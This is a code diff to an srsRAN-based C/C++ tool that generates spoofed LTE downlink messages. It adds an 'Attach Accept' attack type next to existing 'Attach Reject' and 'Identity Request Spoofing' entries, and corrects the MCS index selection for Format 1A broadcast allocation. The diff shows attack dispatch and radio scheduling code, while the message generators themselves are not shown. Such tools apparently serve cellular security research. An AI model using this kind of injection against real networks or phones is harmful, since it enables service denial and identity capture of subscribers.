@@ -56,7 +56,7 @@ enum AttackType {
   SIB1_ORIGINAL,
   ATTACH_REJECT,
   IDENTITY_REQUEST,
-
+  ATTACH_ACCEPT,
   ATTACK_TYPE_COUNT
 };
 struct AttackTypeInfo {
@@ -73,6 +73,7 @@ const AttackTypeInfo attack_types[ATTACK_TYPE_COUNT] = {
   {"sib1_ori",             "SIB1 Original (Normal)"},
   {"attach_reject",        "Attach Reject with Custom Cause"},
   {"identity_request",     "Identity Request Spoofing"},  // 新增
+  {"attach_accept",        "Attach Accept Message Generation"}
 };
 void usage(const char *prog) {
   printf("Usage: %s [options]\n", prog);
@@ -371,11 +372,15 @@ void generate_message(uint8_t* payload[], uint32_t* payload_len, const char* pro
 
     case ATTACH_REJECT:
       printf("\n[RUN] Start to generate Attach Reject msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
-      gen_attach_reject(payload[0], sizeof(uint8_t) * 2048, payload_len);
+      gen_attach_reject_pdu_v1(payload[0], sizeof(uint8_t) * 2048, payload_len);
       break;
-    case 8:
+    case IDENTITY_REQUEST:
       printf("\n[RUN] Start to generate Identity Request msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
       gen_identity_request(payload[0], sizeof(uint8_t) * 2048, payload_len);
+      break;
+    case ATTACH_ACCEPT:
+      printf("\n[RUN] Start to generate Attach Accept msg to subframe %d with rnti = 0x%x.\n", tti, rnti);
+      gen_attach_accept_pdu(payload[0], sizeof(uint8_t) * 2048, payload_len);
       break;
 
     default:
@@ -393,7 +398,11 @@ int get_attack_type_from_name(const char* name) {
   }
   return -1;
 }
-
+static const uint8_t tbs_idx_to_mcs_idx[27] = {
+    0,  1,  2,  3,  4,  5,  6,  7,  8,  9,  // TBS_idx 0~9 → MCS_idx 0~9
+    11, 12, 13, 14, 15, 17, 18, 19, 20, 21, // TBS_idx 10~18
+    22, 23, 24, 25, 26, 27, 28              // TBS_idx 19~26
+};
 int generate_format1a_broadcast(uint32_t tbs_bytes, uint32_t cell_nof_prb, uint32_t rv, uint16_t rnti, srsran_dci_dl_t* dci) {
   /* Calculate I_tbs for this TBS */
   uint32_t l_crb = 0;
@@ -405,17 +414,20 @@ int generate_format1a_broadcast(uint32_t tbs_bytes, uint32_t cell_nof_prb, uint3
       if (srsran_ra_tbs_from_idx(i, 2) >= tbs) {
       dci->type2_alloc.n_prb1a = srsran_ra_type2_t::SRSRAN_RA_TYPE2_NPRB1A_2;
       l_crb                    = 2;
-      mcs                      = i;
+      //mcs                      = i;
+      mcs = tbs_idx_to_mcs_idx[i];
       tbs                      = srsran_ra_tbs_from_idx(i, 2);
       break;
       } else if (srsran_ra_tbs_from_idx(i, 3) >= tbs) {
       dci->type2_alloc.n_prb1a = srsran_ra_type2_t::SRSRAN_RA_TYPE2_NPRB1A_3;
       l_crb                    = 3;
-      mcs                      = i;
+      //mcs                      = i;
+      mcs = tbs_idx_to_mcs_idx[i];
       tbs                      = srsran_ra_tbs_from_idx(i, 3);
       break;
       }
   }
+  printf("Selected MCS index: %d prb:%d\n", mcs, l_crb);
   if (i == 28) {
       ERROR("Can't allocate Format 1A for TBS=%d\n", tbs);
       return -1;
